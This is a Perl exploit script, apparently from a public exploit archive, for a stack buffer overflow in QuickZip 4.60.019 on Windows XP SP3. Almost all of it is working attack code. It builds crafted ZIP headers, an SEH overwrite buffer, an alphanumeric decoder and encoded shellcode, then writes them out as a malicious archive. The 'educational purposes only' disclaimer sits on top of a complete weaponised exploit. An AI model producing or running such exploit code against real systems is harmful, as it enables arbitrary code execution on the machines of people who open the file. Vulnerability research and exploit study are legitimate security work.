# Exploit Title : QuickZip 4.60.019 Stack BOF - XP SP3
# OSVDB-ID      : 62781
# Date          : March 2nd 2010
# Author        : corelanc0d3r
# Bug found by  : corelanc0d3r
# Software Link : http://www.quickzip.org/downloads.html
# Version       : 4.60.019
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox) - offset is 297.
#                 You may have to change this to 294
# Type of vuln  : SEH, with ppr from OS dll
# Greetz to     : Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
# ----------------------------------------------------------------------------------------------------
# Detailed write-up about this vulnerability and exploit
# can be found at
# http://www.offensive-security.com/blog/vulndev/quickzip-stack-bof-a-box-of-chocolates-part-2/
# ----------------------------------------------------------------------------------------------------
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.  
# If you do, Corelan cannot be held responsible for any damages this may cause.
#
#
# Code :
print "|------------------------------------------------------------------|\n";
print "|                         __               __                      |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
print "|                                                                  |\n";
print "|                                       http://www.corelan.be:8800 |\n";
print "|                                                                  |\n";
print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
print "           --==[ Exploit for QuickZip 4.60.019 ]==-- \n\n";

my $sploitfile="corelansploit.zip";
my $ldf_header = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $cdf_header = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f". 
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00". 
"\x02\x10\x00\x00". 
"\x00\x00";

print "[+] Preparing payload\n";

my $nseh="\x41\x41\x41\x41";  
my $seh="\x65\x47\x7e\x6d";   

my $payload = "B" x 297 . $nseh . $seh;  
my $predecoder = "\x59\x59\x59\x51\x5c"; 
my $decoder="\x25\x4A\x4D\x4E\x55".  
"\x25\x35\x32\x31\x2A".
"\x2D\x55\x55\x55\x5F".    
"\x2D\x55\x55\x55\x5F".
"\x2D\x56\x55\x56\x5F".
"\x50".                     
"\x25\x4A\x4D\x4E\x55".     
"\x25\x35\x32\x31\x2A".
"\x2D\x2A\x6A\x31\x55".     
"\x2D\x2A\x6A\x31\x55".
"\x2D\x2B\x5A\x30\x55".
"\x50".                     
"\x73\xf7";                 

$payload=$payload.$predecoder.$decoder;
my $filltoecx="B" x (100-length($predecoder.$decoder));

my $shellcode = "IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BB".
"ABXP8ABuJIhYXkOkXYt4vDjT4qYBNRQjfQO93TLKRQ00nkSFDLLKT6uLN".
"kqV4HLKQnwPLKWF5hPOVxqeicryuQkayoKQU0lKplwTUtlKaUGLlKf4tE".
"CHvaHjNkpJDXLKCjUp6aJKhcgGG9LKp4nk5QxnvQkOP1iPIlNLmTO0RTU".
"ZjaZo4MUQO7M9Xqio9oKOGKcLQ4WXrUKnnkpZdds18kQvnkTLRknkpZUL".
"WqJKlKtDlKUQJHk91Tq4wl3QXCmbs819xTk9HemYkr58LNRntNjLRrKXO".
"lyoio9oNiBe34mkqnjxYr43LGwl7TBrJHLKyokOiomYCuUXQxrL0lupKO".
"QxVSebTnPdbH0uRSsU1bLHQLq4tJNim6RvIoRuWtNio2BpMkI8NBRmmlK".
"7uL7T1BKXQNKOyoYocXPstzQHq0cXWPQcsQRY1xFPRDp3rRcX0lQq0ncS".
"phrCrOCBpefQkknhqL4dwbNiIsSXrEu4PXUpqxepvP47rNQxPb2ErE2NU".
"8SQT6e5WPQxbOpu5psXQxE1CXgPPy0h1qrHCQcXPhrMpuSQphVQO9nh0L".
"6DuNK9HatqKbPR3cV1RrYoxPDqkprpKObuvhA";

my $rest = "C" x  (4064-length($payload.$filltoecx.$shellcode)) . ".txt";
$payload = $payload.$filltoecx.$shellcode.$rest;

my $evilzip = $ldf_header.$payload.$cdf_header.$payload.$eofcdf_header;

print "[+] Writing payload to file\n";

open(FILE,">$sploitfile");
print FILE $evilzip;
close(FILE);
print "[+] Wrote ".length($evilzip)." bytes to file $sploitfile\n";